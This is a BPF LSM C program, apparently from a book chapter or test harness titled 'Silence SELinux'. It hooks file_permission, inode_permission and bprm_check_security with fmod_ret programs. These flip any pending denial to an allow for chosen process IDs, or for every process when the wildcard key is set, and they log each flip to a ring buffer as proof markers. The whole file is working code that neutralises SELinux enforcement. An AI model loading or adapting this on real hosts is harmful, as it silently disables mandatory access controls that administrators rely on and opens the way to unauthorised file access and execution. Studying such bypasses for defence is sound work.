// ch06 Silence SELinux — REAL mutation variant using BPF LSM fmod_ret.
//
// Chapter claim: "force SELinux denials to grants". BPF LSM hooks fire
// *before* SELinux's in-kernel avc_has_perm path, so overriding the outer
// permission hook short-circuits SELinux's verdict entirely: the deny
// never gets a chance to run.
//
// Three sleepable fmod_ret programs cover the common access paths:
//   lsm.s/file_permission       — vfs read/write/execute on an open file
//   lsm.s/inode_permission      — path walk / open-time permission check
//   lsm.s/bprm_check_security   — execve of a label-restricted binary
//
// Each reads the upstream `ret` arg. If the current tgid is in
// target_tgids (or wildcard=0 present) AND ret != 0 (a pending deny),
// flip the return value to 0 (allow). Emit a ringbuf event with
// {pid, comm, hook, orig_ret, flipped}. The loader turns those into
// the `FLIP hook=...` proof markers that the harness scans for.
//
// Prereqs (verify on the host before running):
//   cat /sys/kernel/security/lsm     # must contain "bpf" AND "selinux"
//   bpftool feature probe | grep lsm # must show "lsm_fmod_ret ok"
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

// hook identifiers mirrored by the userspace loader's name table
#define H_FILE_PERMISSION       1
#define H_INODE_PERMISSION      2
#define H_BPRM_CHECK_SECURITY   3

struct evt {
    unsigned int pid, tgid;
    char comm[16];
    int hook;
    int orig_ret;
    int flipped;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

// target_tgids: key=tgid, value=1. Key 0 acts as a wildcard sentinel
// meaning "flip every deny regardless of tgid".
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, unsigned int);
    __type(value, unsigned int);
    __uint(max_entries, 1024);
} target_tgids SEC(".maps");

static __always_inline int is_target_tgid(unsigned int tgid)
{
    if (bpf_map_lookup_elem(&target_tgids, &tgid))
        return 1;
    unsigned int zero = 0;
    if (bpf_map_lookup_elem(&target_tgids, &zero))
        return 1;
    return 0;
}

static __always_inline void emit(int hook, int orig_ret, int flipped)
{
    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return;
    unsigned long long id = bpf_get_current_pid_tgid();
    e->pid = (unsigned int)(id & 0xffffffff);
    e->tgid = (unsigned int)(id >> 32);
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    e->hook = hook;
    e->orig_ret = orig_ret;
    e->flipped = flipped;
    bpf_ringbuf_submit(e, 0);
}

// int security_file_permission(struct file *file, int mask)
// Return 0 to allow, -EACCES/-EPERM to deny. fmod_ret trailing arg is ret.
SEC("lsm.s/file_permission")
int BPF_PROG(lsm_file_permission, struct file *file, int mask, int ret)
{
    (void)file; (void)mask;
    unsigned int tgid = bpf_get_current_pid_tgid() >> 32;
    int flipped = 0;
    int new_ret = ret;
    if (is_target_tgid(tgid) && ret != 0) {
        new_ret = 0;
        flipped = 1;
    }
    emit(H_FILE_PERMISSION, ret, flipped);
    return new_ret;
}

// int security_inode_permission(struct inode *inode, int mask)
SEC("lsm.s/inode_permission")
int BPF_PROG(lsm_inode_permission, struct inode *inode, int mask, int ret)
{
    (void)inode; (void)mask;
    unsigned int tgid = bpf_get_current_pid_tgid() >> 32;
    int flipped = 0;
    int new_ret = ret;
    if (is_target_tgid(tgid) && ret != 0) {
        new_ret = 0;
        flipped = 1;
    }
    emit(H_INODE_PERMISSION, ret, flipped);
    return new_ret;
}

// int security_bprm_check(struct linux_binprm *bprm)
SEC("lsm.s/bprm_check_security")
int BPF_PROG(lsm_bprm_check_security, struct linux_binprm *bprm, int ret)
{
    (void)bprm;
    unsigned int tgid = bpf_get_current_pid_tgid() >> 32;
    int flipped = 0;
    int new_ret = ret;
    if (is_target_tgid(tgid) && ret != 0) {
        new_ret = 0;
        flipped = 1;
    }
    emit(H_BPRM_CHECK_SECURITY, ret, flipped);
    return new_ret;
}
